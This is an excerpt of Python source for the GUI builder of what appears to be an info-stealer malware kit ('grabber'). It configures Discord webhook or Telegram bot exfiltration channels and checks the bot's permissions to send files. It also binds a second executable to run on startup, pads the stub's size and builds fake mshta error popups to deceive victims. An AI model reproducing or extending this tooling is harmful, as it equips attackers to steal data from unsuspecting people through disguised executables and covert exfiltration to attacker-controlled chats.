...
class Utility:
    ...
    def CheckConfiguration() -> None:
        ...
        if os.path.isfile(configFile):
            ...
            _password = input(
                "Please Set A New Password Or Keep The Default : (default: %r): " % Settings.Password).strip()
            if _password:
                password = _password
...
class BuilderOptionsFrame(ctk.CTkFrame):
    ...
    def C2ModeButtonControl_Callback(self) -> None:
        ...
        DISCORD = "Send2: Discord"
        TELEGRAM = "Send2: Telegram"
        ...
        if self.C2Mode == 0:  # Change to Telegram
            self.C2Mode = 1
            buttonText = TELEGRAM
            self.C2EntryControl.configure(
                placeholder_text="Enter Telegram Endpoint: [Telegram Bot Token]$[Telegram Chat ID]")
    ...
    def bindExeButtonControl_Callback(self) -> None:
        ...
        if buttonText == BIND:
            ...
            filePath = ctk.filedialog.askopenfilename(title="Select file to bind", initialdir=".",
                                                      filetypes=allowedFiletypes)
            if os.path.isfile(filePath):
                self.boundExePath = filePath
                self.bindExeButtonControl.configure(text=UNBIND)
                if messagebox.askyesno("Bind Executable", "Should Added Exe Run On Startup?"):
        ...
        if self.C2Mode == 0:
            ...
            if not webhook.startswith(("http://", "https://")):
                messagebox.showerror("Error",
                                     "Invalid protocol for the webhook URL! It must start with either 'http://' or 'https://'.")
                return
            ...
            if not endpoint.count("$") == 1:
                messagebox.showerror("Error",
                                     "Invalid format! Endpoint must be your Telegram bot token and chat ID separated by a single '$' symbol.")
                return
        ...
        def check():
            ...
            if self.C2Mode == 0:
                ...
                if token:
                    try:
                        resp = json.loads(
                            http.request("GET", "https://api.telegram.org/bot%s/getUpdates" % token).data.decode())
                        if not resp["ok"]:
                ...
                if chat_id:
                    if not chat_id.lstrip("-").isdigit() and chat_id.count("-") <= 1:
                        ...
                        try:
                            resp = json.loads(http.request("GET",
                                                           "https://api.telegram.org/bot%s/getChat?chat_id=%s" % (
                                                               token, chat_id)).data.decode())
                            if not resp["ok"]:
                                messagebox.showerror("Error",
                                ...
                                if resp["result"].get("permissions"):
                                    if not resp["result"]["permissions"]["can_send_documents"] or not \
                                            resp["result"]["permissions"]["can_send_messages"]:
                                        messagebox.showerror("Error",
                                                             "The bot does not have the required permissions to send files and messages to the chat!")
                                        return
                ...
                try:
                    http = PoolManager(cert_reqs="CERT_NONE")
                    if http.request("GET", "https://api.telegram.org/bot%s/sendMessage?chat_id=%s&text=%s" % (
                            token, chat_id, quote("Your endpoint is working!"))).status == 200:
...
class PumperSettings(ctk.CTkToplevel):
    ...
    def __init__(self, master) -> None:
        ...
        noteLabel = ctk.CTkLabel(self,
                                 text="Please specify the pumped output file size (in MB).\n Note: If the size of the stub is already greater than the\n provided size, nothing happens.",
                                 font=self.font)
        ...
        self.okButton = ctk.CTkButton(self, text="OK", font=self.font, fg_color="green", hover_color="light green",
                                      text_color_disabled="white", command=self.ok_Event)
...
class FakeErrorBuilder(ctk.CTkToplevel):
    ...
    def __init__(self, master) -> None:
        ...
        self.iconChoiceIn = ctk.CTkRadioButton(self, text="Information", value=48, variable=self.iconVar,
                                               font=self.font)
        self.iconChoiceIn.grid(row=7, column=1, sticky="w", padx=20)

        self.testButton = ctk.CTkButton(self, text="Test", height=28, font=self.font, fg_color="#393646",
                                        hover_color="#6D5D6E", command=self.testFakeError)
        self.testButton.grid(row=4, column=2, padx=20)

        self.saveButton = ctk.CTkButton(self, text="Save", height=28, font=self.font, fg_color="#393646",
                                        hover_color="#6D5D6E", command=self.saveFakeError)
    ...
    def saveFakeError(self) -> None:
        ...
        if title.strip() == message.strip() == "":
            ...
            cmd = '''mshta "javascript:var sh=new ActiveXObject('WScript.Shell'); sh.Popup('Title cannot be empty', 0, 'Error', 0+16);close()"'''.format(
                message, title, icon)
            subprocess.run(cmd, shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
            return

        elif message.strip() == "":
            cmd = '''mshta "javascript:var sh=new ActiveXObject('WScript.Shell'); sh.Popup('Message cannot be empty', 0, 'Error', 0+16);close()"'''.format(
                message, title, icon)
            subprocess.run(cmd, shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
            return
    ...
    def BuildExecutable(self, config: str, iconFileBytes: bytes, boundFilePath: str) -> None:
        ...
        if not os.path.isfile(os.path.join("env", "Scripts", "run.bat")):
            if not os.path.isfile(os.path.join("env", "Scripts", "activate")):
                ...
                clear()
                if res.returncode != 0:
                    print('Error while creating virtual environment ("python -m venv env"): {}'.format(
        ...
        with open(os.path.join(os.path.dirname(__file__), "env", "Scripts", "config.json"), "w", encoding="utf-8",
    ...
    if os.name == "nt":
        if not os.path.isdir(os.path.join(os.path.dirname(__file__), "Components")):
            subprocess.Popen(
                ...
                shell=True, creationflags=subprocess.SW_HIDE | subprocess.CREATE_NEW_CONSOLE)
            exit(1)
        ...
        if "windowsapps" in sys.executable.lower():
            subprocess.Popen(
                'mshta "javascript:var sh=new ActiveXObject(\'WScript.Shell\'); sh.Popup(\'It looks like you installed Python from Windows Store instead of using the official website https://python.org. Please disable/uninstall it and reinstall from the website.\', 10, \'Error\', 16);close()"',
                shell=True, creationflags=subprocess.SW_HIDE | subprocess.CREATE_NEW_CONSOLE)
            exit(1)
        ...
        if Utility.CheckForUpdates():
            ...
            if response:
                webbrowser.open_new_tab("https://bio.link/grabber")
                exit(0)
